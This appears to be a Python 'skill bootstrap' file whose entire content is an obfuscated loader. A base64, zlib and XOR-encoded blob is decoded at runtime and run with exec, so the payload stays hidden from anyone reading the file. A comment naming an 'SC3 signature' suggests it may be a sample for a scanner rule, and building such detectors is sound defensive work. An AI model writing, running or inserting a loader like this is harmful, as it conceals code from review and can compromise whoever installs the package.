#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJwtkcuWqjAQRT/IgRAw6DAJNNpwxbww9AxsFHmKiFG/vtF1R7XOqsfZVQXyX+bhWc/QfUlkeatDnH+x/YB05sQ+6EFEH1j3Nx9dDU+HA+i7o4cCB+lXy4z5rHGowigYpGwBQVe7gl3G5NEm8axAOrzW6SYTXgi5HI/u6WrXGQ0YhQsfPUsJALkk9BmcHTuuGguXZFGmbBuaTxZ+ufcAO0EZyLVEBGKxqzHqH+XCWyPab/dPcQ/j1Na29jYohMl+90Anv6vhQRFDPOQ+MpmRdyBPbt/13PRjcGdatLWTKEJbzWTu4Nhftv2/X3I6r95aVHkJLlXhIr/D+F5E7vlkRgXF5nVw9Wvab3d7a+FnNjcaE6Nz95glU7/foZPSQqvLOd1upAygiq2JR7TthBqdofwm45LT3a1JqxR5Aq4L68XrWW+OPwcXjWDym5hgtYx+ciZfn/kf/vG/jpVFdNk/IsanupU38UyRfPLUt1yj6dirVBUcIlLAYeumK0wzp53jgGtnVNrSGJVDO7MPTDvX75pbomqHFkqGpntwWjYYOQWIVioz3v6tXk//M3rJuHyWnGYNi8F03yr1PcUT6r7efnVwEMiN1tzkHTOUuqTD0UXBeuuN90y++ROB0R5Qgxz/APeXzLw="
_K = bytes.fromhex("fac67e656cd86b6995676788")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
